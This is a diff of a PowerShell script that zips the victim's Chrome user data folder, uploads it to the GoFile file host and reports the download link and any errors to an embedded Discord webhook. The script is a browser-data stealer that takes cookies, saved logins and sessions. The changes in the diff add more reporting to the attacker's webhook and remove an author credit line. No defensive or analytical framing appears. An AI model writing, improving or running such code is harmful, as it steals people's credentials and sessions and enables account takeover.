@@ -1,5 +1,3 @@
-### Created by mrproxy
-
 # $botToken = "bot_token"
 # $chatID = "chat_id"
 $webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"
@@ -50,14 +48,16 @@ function Upload-FileAndGetLink {
     )
 
     # Get URL from GoFile
-    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
+    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer' -Method Get
     if ($serverResponse.status -ne "ok") {
-        Write-Host "Failed to get server URL: $($serverResponse.status)"
+        Write-Host "Failed to get server URL from GoFile: $($serverResponse.status)"
+        Send-DiscordMessage -message "GoFile server request failed: $($serverResponse.status)"
         return $null
     }
 
     # Define the upload URI
     $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
+    Write-Host "Using upload URI: $uploadUri"
 
     # Prepare the file for uploading
     $fileBytes = Get-Content $filePath -Raw -Encoding Byte
@@ -79,11 +79,14 @@ function Upload-FileAndGetLink {
         $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         if ($response.status -ne "ok") {
             Write-Host "Failed to upload file: $($response.status)"
+            Send-DiscordMessage -message "Failed to upload file to GoFile: $($response.status)"
             return $null
         }
+        Write-Host "File uploaded successfully, download page: $($response.data.downloadPage)"
         return $response.data.downloadPage
     } catch {
         Write-Host "Failed to upload file: $_"
+        Send-DiscordMessage -message "Error uploading file to GoFile: $_"
         return $null
     }
 }
@@ -95,37 +98,26 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Use Compress-Archive for zipping (this is a built-in PowerShell cmdlet)
+# Create a zip of the Chrome User Data
 $outputZip = "$env:TEMP\chrome_data.zip"
 
-# Remove the existing zip file if it exists
+# Ensure the file is not in use and delete it if it exists
 if (Test-Path $outputZip) {
-    $retries = 5
-    $attempt = 0
-    while ($attempt -lt $retries) {
-        try {
-            # Try removing the file
-            Remove-Item $outputZip -Force
-            Write-Host "Removed existing zip file: $outputZip"
-            break
-        } catch {
-            Write-Host "Failed to remove zip file, attempt $($attempt + 1): $_"
-            $attempt++
-            Start-Sleep -Seconds 1  # Wait for a second before retrying
-            if ($attempt -eq $retries) {
-                Send-DiscordMessage -message "Failed to remove existing zip file after $retries attempts."
-                exit
-            }
-        }
+    try {
+        Remove-Item $outputZip -Force
+        Write-Host "Removed existing zip file"
+    } catch {
+        Write-Host "Failed to remove existing zip file: $_"
     }
 }
 
+# Compress the Chrome User Data
 try {
-    # Create the zip file, force overwrite if it exists
     Compress-Archive -Path $chromePath -DestinationPath $outputZip -Force
-    Write-Host "Compression successful, file saved at: $outputZip"
+    Write-Host "Chrome user data compressed successfully"
 } catch {
-    Send-DiscordMessage -message "Error creating zip file with Compress-Archive: $_"
+    Write-Host "Error creating zip file with Compress-Archive: $_"
+    Send-DiscordMessage -message "Error creating zip file: $_"
     exit
 }
 
@@ -141,7 +133,4 @@ if ($link -ne $null) {
 
 # Remove the zip file after uploading
 Remove-Item $outputZip -Force
-
-# Ensure the script exits after all operations are complete
-Write-Host "Script completed successfully, exiting."
-exit
+Write-Host "Removed the zip file after upload"
